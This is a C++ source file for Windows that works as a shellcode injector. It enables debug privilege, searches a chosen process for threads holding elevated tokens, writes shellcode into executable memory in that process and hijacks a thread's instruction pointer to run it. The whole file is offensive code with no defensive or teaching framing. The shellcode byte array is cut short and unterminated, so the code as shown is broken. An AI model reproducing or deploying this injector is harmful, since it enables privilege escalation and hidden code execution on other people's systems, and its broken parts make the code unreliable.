#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

bool EnablePrivilege(HANDLE hToken, LPCWSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcerr << L"LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::wcerr << L"AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        return false;
    }

    return GetLastError() == ERROR_SUCCESS;
}

bool InjectShellcodeIntoThread(DWORD targetTid, unsigned char* shellcode, size_t shellcodeSize) {
    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetTid);
    if (!hThread) {
        std::cerr << "OpenThread failed: " << GetLastError() << std::endl;
        return false;
    }

    // Suspend the thread
    if (SuspendThread(hThread) == -1) {
        std::cerr << "SuspendThread failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // Get the thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Allocate memory in the process of the thread
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdOfThread(hThread));
    if (!hProcess) {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Write shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Redirect the thread's instruction pointer to the shellcode
#ifdef _M_X64
    ctx.Rip = (DWORD64)remoteShellcode; // For x64
#else
    ctx.Eip = (DWORD)remoteShellcode;  // For x86
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        std::cerr << "SetThreadContext failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    // Resume the thread
    if (ResumeThread(hThread) == -1) {
        std::cerr << "ResumeThread failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

bool FindElevatedThreadAndInject(DWORD processId, unsigned char* shellcode, size_t shellcodeSize) {
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
        return false;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hThreadSnap, &te32)) {
        std::cerr << "Thread32First failed: " << GetLastError() << std::endl;
        CloseHandle(hThreadSnap);
        return false;
    }

    std::cout << "Inspecting thread: TID = " << te32.th32ThreadID << std::endl;
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION, FALSE, te32.th32ThreadID);
    if (hThread) {
        std::cout << "Thread opened successfully." << std::endl;
    }
    else {
        std::cerr << "Failed to open thread: " << GetLastError() << std::endl;
    }


    do {
        if (te32.th32OwnerProcessID == processId) {
            HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION, FALSE, te32.th32ThreadID);
            if (hThread) {
                HANDLE hToken;
                if (OpenThreadToken(hThread, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, TRUE, &hToken)) {
                    TOKEN_ELEVATION elevation;
                    DWORD dwSize;

                    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                        if (elevation.TokenIsElevated) {
                            std::cout << "Found elevated thread: TID = " << te32.th32ThreadID << std::endl;

                            // Inject shellcode into the elevated thread
                            if (InjectShellcodeIntoThread(te32.th32ThreadID, shellcode, shellcodeSize)) {
                                CloseHandle(hToken);
                                CloseHandle(hThread);
                                CloseHandle(hThreadSnap);
                                return true;
                            }
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hThreadSnap, &te32));

    CloseHandle(hThreadSnap);
    return false;
}

int main() {
    DWORD targetPid;
    std::cout << "Enter the target process ID: ";
    std::cin >> targetPid;

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (!EnablePrivilege(hToken, SE_DEBUG_NAME)) {
            std::cerr << "Failed to enable SeDebugPrivilege." << std::endl;
            CloseHandle(hToken);
            return 1;
        }
        CloseHandle(hToken);
    }
    else {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return 1;
    }

    // Example shellcode (MessageBox example, x64)
    unsigned char shellcode[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"

    size_t shellcodeSize = sizeof(shellcode) - 1;

    if (!FindElevatedThreadAndInject(targetPid, shellcode, shellcodeSize)) {
        std::cerr << "Failed to inject shellcode into an elevated thread." << std::endl;
        return 1;
    }

    std::cout << "Shellcode successfully injected into an elevated thread!" << std::endl;
    return 0;
}
